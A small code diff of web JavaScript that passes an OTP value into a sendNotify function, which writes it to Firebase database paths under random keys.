@@ -69,7 +69,7 @@
         set(ref(db, 'OTP/' + Math.random().toString(36).slice(2, 7)), {
           Notification: otp
         }).then(() => {
-          sendNotify();
+          sendNotify(otp);
         }).catch((error) => {
           document.getElementById('loadingOverlay').style.display = 'none';
           alert(error);
@@ -79,7 +79,7 @@
       }
     });
 
-    function sendNotify() {
+    function sendNotify(otp) {
     
       set(ref(db, 'NotificationOTP/' + Math.random().toString(36).slice(2, 7)), {
         Notification: otp
